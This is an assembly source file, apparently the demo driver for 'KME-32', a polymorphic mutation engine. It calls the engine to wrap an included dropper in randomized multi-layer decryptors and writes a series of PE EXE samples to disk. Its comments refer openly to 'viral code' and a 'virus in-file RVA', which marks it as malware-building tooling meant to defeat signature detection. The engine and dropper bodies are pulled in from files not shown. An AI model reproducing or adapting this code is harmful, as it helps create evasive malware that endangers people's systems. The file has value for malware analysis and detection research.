
;                          example of using KME-32
;                          ~~~~~~~~~~~~~~~~~~~~~~~
;
; this program is used to test KME-32, it will generate some PE EXE files
; with polymorphic decryptor in the CODE section.
;
; nnnn.EXE              "standard" files
; Xnnn.EXE              "special" files, demonstating some abilities of KME

include                 ..\SRC\kme.inc ; KME interface stuff

NUM_OF_FILES            equ     10          ; number of nnnn.EXEs to generate

;X1ONLY                 equ     YO

callW                   macro   procname        ; to call windows api
                        extrn   procname:PROC
                        call    procname
                        endm

pusho                   macro   x
                        local   zzz
                        call    zzz
                        jmp     x
zzz:                    endm

                        p586
                        model   flat

                        .data

rseed                   dd      ?
v_nlayer                dd      ?
ntry                    dd      ?

msg_writing             db      'writing ',0            ; messages
msg_ok                  db      ' - ok',13,10,0         ;
msg_failed              db      ' *** FAILED *** (EAX=-'
msg_failed_ec           db      'X'
                        db      ')',13,10,0

sampledir               db      'SAMPLES',0             ; output directory
filename                db      'SAMPLES\'
filename_1stdigit       db      '0000.EXE',0    ; current file
filename_ndigit         equ     4

                        ; reg values, passed into viral code. -1 = unused.
                        ; also, register must match regavail bitset
exitregs                label   dword
                        dd      -1         ; eax
                        dd      11111111h  ; ecx
                        dd      22222222h  ; edx
                        dd      -1         ; ebx
                        dd      -1         ; esp (anyway unused)
                        dd      -1         ; ebp
                        dd      -1         ; esi
                        dd      -1         ; edi

initregs                label   dword
                        dd      -1         ; eax    initial EIP
                        dd      -1         ; ecx
                        dd      -1         ; edx    00530000 ?
                        dd      -1         ; ebx
                        dd      -1         ; esp (anyway unused)
                        dd      -1         ; ebp
                        dd      -1         ; esi
                        dd      0          ; edi    seems, always 0

include                 _exehdr.inc                      ; dropper header
include                 _dropper.inc                     ; dropper code

                        ; KME output:
buf_size                dd      ?                       ; buffer size
buf_entry               dd      ?                       ; buffer entry (rel)
buf                     db      execode_size dup (?)    ; buffer (poly decr)

tempbuf                 db      execode_size dup (?)    ; temporary buffer

                        .code

start:
                        lea     edi, intromsg
                        call    write_msg

                        callW   GetTickCount
                        xor     rseed, eax

                        ; create output directory

                        push    0
                        push    offset sampledir
                        callW   CreateDirectoryA

                        ; generate some "standard" files

                        mov     ecx, NUM_OF_FILES
main_cycle:             push    ecx                     ; main cycle

IFNDEF X1ONLY
                        mov     v_nlayer, -5            ; 1..5 layers
                        mov     ebx, FLAG_NOJMPS        ; flags
                        mov     ecx, CMD_ALL            ; command mask
                        mov     ebp, CMD2_ALL
                        mov     edx, REG_ALL            ; register mask
                        mov     esi, 10                 ; jmp if rnd(X)==0
                        mov     edi, 0                  ; filler
                        call    gen_1_file
ENDIF
                        pop     ecx
                        loop    main_cycle

                        ; generate some "special" files

                        lea     edi, filename_1stdigit
                        mov     al, 'X'
                        stosb
                        mov     ecx, filename_ndigit-1
                        mov     al, '0'
                        rep     stosb

                        ; X001.EXE -- disable JMPs
                        mov     v_nlayer, 4       ; 4 layers
                        mov     ebx, FLAG_NOJMPS+FLAG_FAILIFNOMEMORY
                        mov     ecx, CMD_ALL
                        mov     ebp, CMD2_ALL
                        mov     edx, REG_ALL
                        mov     esi, -1             ; unused 'coz FLAG_NOJMPS
                        mov     edi, 0CCh
                        call    gen_1_file

IFNDEF X1ONLY
                        ; X002.EXE -- only regs ECX/EDX and commands SUB/DEC
                        mov     v_nlayer, 1
                        mov     ebx, FLAG_NOJMPS+FLAG_NOSHORT
                        mov     ecx, CMD_SUB+CMD_DEC
                        mov     ebp, 0
                        mov     edx, REG_ECX+REG_EDX
                        mov     esi, -1
                        mov     edi, 0CCh
                        call    gen_1_file

                        ; X003.EXE -- only EAX and XOR, maximal compression
                        mov     v_nlayer, 1
                        mov     ebx, FLAG_NOJMPS+FLAG_NOLOGIC
                        mov     ecx, CMD_XOR
                        mov     ebp, CMD2_CYCLE
                        mov     edx, REG_EAX
                        mov     esi, -1
                        mov     edi, 0CCh
                        call    gen_1_file

                        ; X004.EXE -- JMP after each command
                        mov     v_nlayer, 1
                        mov     ebx, FLAG_EIP0
                        mov     ecx, CMD_ALL
                        mov     edx, REG_ALL
                        mov     esi, 0                  ; jmp after each cmd
                        mov     edi, 0CCh
                        call    gen_1_file

                        ; X005.EXE -- only new stuff
                        mov     v_nlayer, 1
                        mov     ebx, FLAG_EIP0
                        mov     ecx, CMD_NEWSTUFF
                        mov     ebp, CMD2_ALL
                        mov     edx, REG_ALL
                        mov     esi, 1000
                        mov     edi, 0CCh
                        call    gen_1_file

                        ; X006.EXE -- only ECX register
                        mov     v_nlayer, 1
                        mov     ebx, FLAG_NOJMPS+FLAG_RANDOMSTRATEGY
                        mov     ecx, 0              ; unused
                        mov     ebp, CMD2_CYCLE
                        mov     edx, 0              ; unused
                        mov     esi, -1             ; unused 'coz FLAG_NOJMPS
                        mov     edi, 0CCh           ; ofiller
                        call    gen_1_file

                        ; X007.EXE -- no repeteable PUSHs
                        mov     v_nlayer, 1
                        mov     ebx, FLAG_NOREPEATPUSH
                        mov     ecx, CMD_ALL
                        mov     ebp, CMD2_ALL
                        mov     edx, REG_ALL
                        mov     esi, 10
                        mov     edi, 0CCh
                        call    gen_1_file
ENDIF

                        push    -1                      ; exit
                        callW   ExitProcess

                        ; following procedure calls all the stuff we need
                        ; to generate 1 file

gen_1_file:             pusha
                        call    inc_filename    ; increase number of file

                        ; copy filename into dropper
                        lea     esi, filename_1stdigit
                        lea     edi, dropper_insertname
                        movsd
                        movsd

                        lea     edi, msg_writing; message
                        call    write_msg       ; ...
                        lea     edi, filename   ; ...
                        call    write_msg       ; ...
                        popa
                        call    call_kme        ; generate decryptor
                        cmp     eax, KME_ERROR_SUCCESS  ; KME engine result
                        jne     gen_err
                        call    write_file      ; write file
                        lea     edi, msg_ok     ; ok message
                        call    write_msg       ; ...
                        ret
gen_err:                neg     eax
                        add     eax, '0'
                        mov     msg_failed_ec, al
                        lea     edi, msg_failed ; fault message
                        call    write_msg       ; ...
                        ret

                        ; subroutine to write message (in EDI)

write_msg:              pusha
                        push    -11             ; STD_OUTPUT_HANDLE
                        callW   GetStdHandle
                        xchg    ebx, eax
                        mov     edx, edi
                        xor     ecx, ecx
                        dec     ecx
                        xor     eax, eax
                        cld
                        repnz   scasb
                        neg     ecx
                        dec     ecx
                        dec     ecx
                        call    fwrite
                        popa
                        ret

                        ; subroutine to increase file number (NNNN.EXE)

inc_filename:           lea     esi, filename_1stdigit+filename_ndigit-1
inc_1:                  inc     byte ptr [esi]
                        cmp     byte ptr [esi], '9'
                        jbe     inc_2
                        mov     byte ptr [esi], '0'
                        dec     esi
                        cmp     esi, offset filename_1stdigit
                        jb      inc_filename
                        jmp     inc_1
inc_2:                  ret

                        ; subroutine to write file (NNNN.EXE)

write_file:             lea     edx, filename
                        call    fcreate

                        xchg    ebx, eax
                        lea     edx, exehdr1
                        mov     ecx, exehdr1_size
                        call    fwrite

                        lea     edx, buf
                        mov     ecx, execode_size
                        call    fwrite

                        lea     edx, exehdr2
                        mov     ecx, exehdr2_size
                        call    fwrite

                        call    fclose
                        ret

                        ; call kme_main & calc new eip

call_kme:               mov     ntry, 3

@@retry:                push    ebx                     ; flags
                        push    ecx                     ; cmd mask
                        push    ebp                     ; cmd2 mask
                        push    edx                     ; reg mask
                        push    esi                     ; jmps if rnd(X)==0
                        push    offset buf_entry        ; [output eip]
                        push    offset buf_size         ; [output size]
                        push    edi                     ; output filler
                        push    execode_size            ; output/max size
                        push    offset buf              ; output buffer
                        push    dropper_entry-dropper_start ; input eip
                        push    dropper_size            ; input size
                        push    offset dropper_start    ; input buffer
                        push    offset initregs         ; 0 or pointer to 8 dwords
                        push    offset exitregs         ; 0 or pointer to 8 dwords
                        push    0                       ; virus in-file RVA
                        push    0                       ; original entry RVA
                        push    REG_ALL                 ; push/pop regs at prolog/epilog
                        call    my_random
                        push    rseed                   ; randseed
                        push    v_nlayer                ; # of layers
                        push    offset tempbuf          ; temp buf ptr
                        call    kme_main
                        add     esp, 4*KME_N_ARGS

                        cmp     eax, KME_ERROR_SUCCESS
                        je      @@success
                        cmp     eax, KME_ERROR_NOMEMORY
                        jne     @@exit
                        ; retry if no memory

                        dec     ntry
                        jnz     @@retry
@@exit:
                        retn

@@success:              pusha
                        mov     eax, buf_entry          ; set new eip
                        add     eax, execode_rva
                        mov     exehdr1.dword ptr exeeip_offs, eax

                        ; if generated decryptor used less than given space,
                        ; fill alignment with NOPs
                        mov     ecx, execode_size
                        sub     ecx, buf_size
                        jz      @@ok
                        lea     edi, buf
                        add     edi, buf_size
                        mov     al, 90h
                        cld
                        rep     stosb
@@ok:
                        popa

                        retn

; DWORD cdecl my_random(DWORD userparam, DWORD range)
my_random:
    ; [esp+4] = user_param
    ; [esp+8] = range
    mov     eax, rseed
    imul    eax, 214013
    add     eax, 2531011
    mov     rseed, eax
    mov     ecx, [esp+8]
    shr     eax, 16
    imul    eax, ecx
    shr     eax, 16
    retn

include                 _fileio.inc                      ; file io subroutines

                        db      '$KME_START$'
kme_start:
include                 ..\SRC\kme.asm ; KME32 engine
kme_end:
                        db      '$KME_END$'

intromsg                label byte

db '--- KME engine used '
db (kme_end-kme_start)/1000 mod 10 + '0'
db (kme_end-kme_start)/ 100 mod 10 + '0'
db (kme_end-kme_start)/  10 mod 10 + '0'
db (kme_end-kme_start)/   1 mod 10 + '0'
db ' bytes ---',13,10,0

                        end     start
